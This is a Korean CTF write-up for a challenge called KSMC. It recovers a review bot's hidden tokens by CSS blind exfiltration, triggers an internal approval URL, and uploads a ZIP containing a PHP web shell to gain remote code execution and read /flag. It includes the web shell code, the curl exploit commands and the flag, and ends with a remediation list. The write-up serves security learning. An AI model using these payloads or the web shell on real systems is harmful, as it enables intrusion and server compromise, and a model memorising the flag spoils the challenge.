# KSMC - CSS Blind Exfiltration과 ZIP 배포를 연결한 RCE 공격

## 개요

- 대상: `http://43.203.187.25:8080`
- 미러 인스턴스: `http://54.116.218.21:8080`
- 목표: 서버의 `/flag` 획득
- 최종 Flag:

```text
FLAG{bcf1b18e111d5df1c2d90137a8a0c6b22c023b860471840468df113ba78b2043}
```

공격 체인은 다음과 같다.

1. 일반 사용자 계정 생성
2. 사용자 CSS 출력 서식 등록
3. CSS 선택자 기반 blind exfiltration으로 검토 토큰 복구
4. 검토 토큰을 probe로 증명한 뒤 내부 승인 URL 호출
5. 승인 영수증으로 브랜딩 ZIP 업로드
6. 공개 디렉터리에 PHP 파일을 배포하여 RCE 획득
7. `/flag` 읽기

## 1. 서비스 분석

메인 페이지에서 다음 기능을 확인할 수 있다.

- 회원가입 및 로그인
- 기관 출력 서식용 CSS 등록
- 내부 렌더러 검토 요청
- 승인된 서식에 브랜딩 ZIP 패키지 배포

공개 문서인 `/technology/brand-package-api`에는 전체 흐름이 안내되어 있다.

```text
서식 등록 → 검토 요청 → 승인 확인 → ZIP 패키지 배포
```

회원가입 후 `/my/service`에 접근하면 출력 서식 관리 폼과 다음 JavaScript를 확인할 수 있다.

```text
/js/template-console.js?v=20261008-1
```

주요 API는 다음과 같다.

| 기능 | 요청 |
|---|---|
| 서식 생성 | `POST /api/v1/print-templates` |
| 서식 수정 | `PATCH /api/v1/print-templates/{id}` |
| 검토 요청 | `POST /api/v1/print-templates/{id}/submit` |
| 상태 확인 | `GET /api/v1/print-templates/{id}` |
| 미리보기 | `GET /my/service/print-templates/{id}/preview` |
| 패키지 업로드 | `POST /api/v1/brand-packages/import` |

## 2. 계정 생성

Laravel CSRF 토큰과 세션 쿠키가 필요하므로 회원가입 페이지를 먼저 요청한다.

```bash
BASE='http://43.203.187.25:8080'
COOKIE='/tmp/ksmc.cookies'

PAGE=$(curl -sS -c "$COOKIE" "$BASE/register")
TOKEN=$(printf '%s' "$PAGE" \
  | rg -o 'name="_token" value="[^"]+' \
  | head -1 \
  | cut -d'"' -f4)

curl -sS -b "$COOKIE" -c "$COOKIE" \
  -X POST "$BASE/register" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode 'name=CTF Tester' \
  --data-urlencode 'email=ctf@example.com' \
  --data-urlencode 'password=KsmcCtf!2026' \
  --data-urlencode 'password_confirmation=KsmcCtf!2026'
```

가입이 완료되면 `/my/service`로 리다이렉트된다.

## 3. 출력 서식 생성

정상 CSS로 초안을 생성한다.

```bash
curl -sS -b "$COOKIE" \
  -H 'Accept: application/json' \
  -H 'Content-Type: application/json' \
  -X POST "$BASE/api/v1/print-templates" \
  --data '{
    "name":"CTF template",
    "css":".certificate{border-color:#0874b9}"
  }'
```

응답 예시는 다음과 같다.

```json
{
  "id": "559b973c-ab63-434d-ad54-88ae13a085b3",
  "state": "draft",
  "probes": [],
  "preview": "/my/service/print-templates/559b973c-ab63-434d-ad54-88ae13a085b3/preview"
}
```

이후 서식 ID를 `TEMPLATE_ID`로 사용한다.

## 4. 미리보기 페이지의 민감 속성

미리보기 페이지에는 다음 요소가 존재한다.

```html
<section id="branding-policy"
         data-review-context="restricted"
         data-channel="restricted"
         data-probe-path="/api/v1/print-templates/{id}/probes/{label}">
    브랜딩 정책: 검토자 전용 정보
</section>
```

일반 사용자가 열면 두 속성은 `restricted`지만, 내부 검토 봇이 접근할 때는 다음 형식의 실제 토큰이 삽입된다.

```text
data-review-context="ctx-................"
data-channel="chn-................"
```

서식의 CSS는 검토 봇 페이지에도 그대로 적용된다. 따라서 CSS 속성 선택자로 토큰의 접두사를 검사하고, 일치할 경우 probe URL을 이미지로 요청하게 만들 수 있다.

```css
[data-review-context^="ctx-a"] {
    background-image: url("/api/v1/print-templates/TEMPLATE_ID/probes/x-a");
}

[data-review-context^="ctx-b"] {
    background-image: url("/api/v1/print-templates/TEMPLATE_ID/probes/x-b");
}
```

검토 후 상태 API를 조회하면 요청된 probe 라벨이 노출된다.

```json
{
  "state": "pending",
  "probes": ["x-b"]
}
```

이는 토큰의 다음 글자가 `b`임을 의미한다.

## 5. CSS blind exfiltration 자동화

토큰 문자 집합은 소문자와 숫자로 구성된다.

```text
abcdefghijklmnopqrstuvwxyz0123456789_-
```

한 번의 검토에서 가능한 다음 문자를 모두 검사한다. 여러 규칙의 URL이 덮어써지는 것을 막기 위해 각 후보를 CSS 사용자 정의 속성에 저장하고, 마지막 `background-image`에서 모두 참조한다.

개념적인 생성 코드는 다음과 같다.

{% raw %}
```python
alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_-"
known = "ctx-"
rules = []
images = []

for index, char in enumerate(alphabet):
    variable = f"--x{index}"
    rules.append(
        f'[data-review-context^="{known + char}"]'
        f'{{{variable}:url(/api/v1/print-templates/{template_id}/probes/x-{char})}}'
    )
    images.append(f"var({variable},none)")

rules.append(
    "#branding-policy{background-image:" + ",".join(images) + "}"
)

css = "".join(rules)
```
{% endraw %}

토큰의 끝을 확인하기 위한 정확 일치 규칙도 추가한다.

```css
[data-review-context="현재까지_복구한_값"] {
    --end: url("/api/v1/print-templates/TEMPLATE_ID/probes/x-end");
}
```

`data-channel`도 같은 방식으로 동시에 추출한다.

```css
[data-channel^="chn-a"] { /* h-a probe */ }
```

검토 요청은 다음과 같다.

```bash
curl -sS -b "$COOKIE" \
  -H 'Accept: application/json' \
  -H 'Content-Type: application/json' \
  -X POST "$BASE/api/v1/print-templates/$TEMPLATE_ID/submit" \
  --data '{}'
```

검토가 끝나면 상태가 `rejected`가 되지만, 같은 서식 ID를 다시 수정해 `draft`로 되돌릴 수 있다. 이때 내부 검토 토큰은 변경되지 않는다.

```bash
curl -sS -b "$COOKIE" \
  -H 'Accept: application/json' \
  -H 'Content-Type: application/json' \
  -X PATCH "$BASE/api/v1/print-templates/$TEMPLATE_ID?force=1" \
  --data "$PAYLOAD"
```

이 과정을 반복하면 두 토큰 전체를 복구할 수 있다. 실제 공격에서 복구된 값의 형식은 다음과 같았다.

```text
ctx-<16자리 난수>
chn-<16자리 난수>
```

토큰은 인스턴스와 서식마다 달라지므로 고정값을 사용할 수 없다.

## 6. 내부 승인 엔드포인트 호출

서식 상태 API 응답 헤더에는 내부 승인 엔드포인트가 노출된다.

```http
Link: </internal/template-reviews/{id}/decision?state=approved&scope=brand-publisher>;
      rel="moderation";
      type="image/svg+xml"
```

승인 요청 전에 복구한 두 토큰을 probe 라벨로 기록해야 한다. 이후 CSS 애니메이션을 이용해 1초 뒤 내부 승인 URL을 요청한다.

```css
#branding-policy {
    background-image:
        url("/api/v1/print-templates/TEMPLATE_ID/probes/CTX_TOKEN"),
        url("/api/v1/print-templates/TEMPLATE_ID/probes/CHN_TOKEN");
    animation: approve 1s step-end forwards;
}

@keyframes approve {
    to {
        background-image: url(
            "/internal/template-reviews/TEMPLATE_ID/decision?state=approved&scope=brand-publisher"
        );
    }
}
```

검토 봇 세션에서 다음 순서로 요청이 발생한다.

1. `CTX_TOKEN` probe 기록
2. `CHN_TOKEN` probe 기록
3. 내부 승인 URL 호출

성공하면 상태 API가 `approved`와 패키지 업로드 영수증을 반환한다.

```json
{
  "state": "approved",
  "capability": {
    "profile": "brand-archive",
    "receipt": "22_CHARACTER_RECEIPT",
    "import": "/api/v1/brand-packages/import",
    "binding": "same-account approved print template"
  }
}
```

## 7. 브랜딩 ZIP 업로드 취약점

패키지 업로드 API는 다음 필드를 요구한다.

```text
template_id
review_receipt
archive
```

ZIP 루트에는 `manifest.json`이 필요하다.

```json
{
  "name": "KSMC Dynamic Assets",
  "version": "1.0.0"
}
```

경로 순회 엔트리는 `Unsafe archive path` 오류로 차단됐으며, ZIP 심볼릭 링크도 실제 링크가 아니라 일반 파일로 추출됐다. 그러나 확장자 검증이 없고 추출 위치가 웹 공개 디렉터리였다.

```text
/var/www/html/public/runtime/brand-packages/{package_id}/
```

또한 Nginx/PHP-FPM 설정이 이 디렉터리의 `.php` 파일을 실행했다. 따라서 정상적인 ZIP 경로에 PHP 파일을 넣는 것만으로 RCE가 가능하다.

### 악성 ZIP 생성

```python
import io
import json
import zipfile

buffer = io.BytesIO()

with zipfile.ZipFile(buffer, "w") as archive:
    archive.writestr(
        "manifest.json",
        json.dumps({
            "name": "KSMC Dynamic Assets",
            "version": "1.0.0",
        }),
    )

    archive.writestr(
        "probe.php",
        '''<?php
        header("Content-Type: text/plain");
        $command = $_GET["c"] ?? "id";
        echo shell_exec($command);
        ?>''',
    )

with open("dynamic-assets.zip", "wb") as output:
    output.write(buffer.getvalue())
```

### ZIP 업로드

```bash
curl -sS -b "$COOKIE" \
  -H 'Accept: application/json' \
  -X POST "$BASE/api/v1/brand-packages/import" \
  -F "template_id=$TEMPLATE_ID" \
  -F "review_receipt=$RECEIPT" \
  -F 'archive=@dynamic-assets.zip;type=application/zip'
```

성공 응답은 공개 asset 경로를 반환한다.

```json
{
  "state": "published",
  "asset_base": "/runtime/brand-packages/PACKAGE_ID/"
}
```

## 8. RCE 및 Flag 획득

업로드한 PHP 파일을 호출한다.

```bash
PACKAGE_ID='응답에서 받은 패키지 ID'

curl -sS --get \
  "$BASE/runtime/brand-packages/$PACKAGE_ID/probe.php" \
  --data-urlencode 'c=id; pwd'
```

실행 결과:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html/public/runtime/brand-packages/PACKAGE_ID
```

Flag 파일을 탐색한다.

```bash
curl -sS --get \
  "$BASE/runtime/brand-packages/$PACKAGE_ID/probe.php" \
  --data-urlencode 'c=find / -maxdepth 5 -type f -iname "*flag*" 2>/dev/null'
```

`/flag`가 확인되므로 파일을 읽는다.

```bash
curl -sS --get \
  "$BASE/runtime/brand-packages/$PACKAGE_ID/probe.php" \
  --data-urlencode 'c=cat /flag'
```

최종 정답:

```text
FLAG{bcf1b18e111d5df1c2d90137a8a0c6b22c023b860471840468df113ba78b2043}
```

첫 번째 인스턴스의 `/flag` 출력에는 닫는 중괄호가 하나 더 붙어 있었지만, 정답 형식은 위와 같이 닫는 중괄호 하나를 사용한다.

## 9. 취약점 정리

### 취약점 1: 사용자 CSS의 내부 검토 페이지 적용

공격자가 제어하는 CSS가 민감한 `data-*` 속성을 포함한 내부 페이지에 적용됐다.

### 취약점 2: 외부에서 조회 가능한 probe 결과

검토 봇이 요청한 probe 라벨을 일반 사용자가 상태 API에서 확인할 수 있어 blind CSS exfiltration이 가능했다.

### 취약점 3: 거절된 서식의 반복 검토

같은 서식 ID를 수정하고 재검토할 수 있었으며, 검토 토큰이 유지되어 한 글자씩 전체 토큰을 복구할 수 있었다.

### 취약점 4: 내부 승인 URL 노출 및 GET 상태 변경

내부 승인 URL이 `Link` 헤더에 노출됐고, GET 요청만으로 승인 상태가 변경됐다.

### 취약점 5: ZIP 파일 확장자 검증 부재

브랜딩 자산 ZIP에 `.php` 파일을 포함할 수 있었다.

### 취약점 6: 업로드 디렉터리에서 PHP 실행

사용자 업로드 디렉터리가 웹 루트 아래에 있으며 PHP 실행까지 허용되어 원격 코드 실행으로 이어졌다.

## 10. 권장 대응 방안

1. 사용자 CSS를 별도 오리진과 샌드박스 환경에서 렌더링한다.
2. 검토 토큰 등 민감한 값을 DOM 속성에 포함하지 않는다.
3. probe 결과를 일반 사용자에게 반환하지 않는다.
4. 승인 동작을 GET이 아닌 CSRF 보호된 POST 요청으로 변경한다.
5. ZIP 내부 파일의 확장자와 MIME 유형을 allowlist로 검증한다.
6. 업로드 디렉터리에서 PHP 및 기타 서버 측 스크립트 실행을 비활성화한다.
7. 업로드 파일을 웹 루트 밖에 저장하고 애플리케이션을 통해서만 제공한다.
8. 검토가 끝난 토큰은 즉시 폐기하고 재사용하지 않는다.
9. 거절된 서식 재검토 시 새로운 검토 토큰을 발급한다.
